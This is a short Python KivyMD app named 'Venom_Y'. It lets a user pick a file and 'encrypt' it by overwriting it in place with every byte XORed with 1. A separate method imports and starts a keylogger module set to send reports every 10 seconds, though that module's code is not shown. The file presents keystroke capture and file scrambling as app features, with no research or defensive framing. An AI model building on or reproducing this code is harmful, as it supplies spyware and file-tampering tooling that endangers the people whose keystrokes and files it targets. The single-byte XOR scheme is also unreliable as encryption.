from kivymd.app import MDApp
from kivymd.toast import toast
from kivymd.uix.filemanager import MDFileManager

import keylogger

class Testapp(MDApp):
    def build(self):
        self.theme_cls.primary_palette = "BlueGray"
        self.theme_cls.theme_style = "Dark"
        self.title = "Venom_Y"
        self.path=""
        return 

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.manager_open = False
        self.file_manager = MDFileManager(
            exit_manager=self.exit_manager,
            select_path=self.select_path,
        )

    def file_manager_open(self):
        self.file_manager.show("/Users/Krishna/Desktop")  # output manager to the screen
        self.manager_open = True

    def select_path(self, path):
        self.exit_manager()
        self.path=path
        toast(self.path)
    
    def exit_manager(self, *args):
        self.manager_open = False
        self.file_manager.close()

    def to_encrypt(self):
        if self.path:
            try:
                key = 1
                fin = open(self.path,'rb')
                ob = fin.read()
                fin.close()
                ob= bytearray(ob)
                for index, values in enumerate(ob):
                    ob[index] = values ^ key
                fin = open(self.path, 'wb')
                fin.write(ob)
                fin.close()
                toast('done')
            except Exception:
                toast('Error caught', Exception.__name__)
    def logger(self):
        SEND_REPORT_EVERY = 10
        key = keylogger.Keylogger(interval=SEND_REPORT_EVERY)
        key.start()

Testapp().run()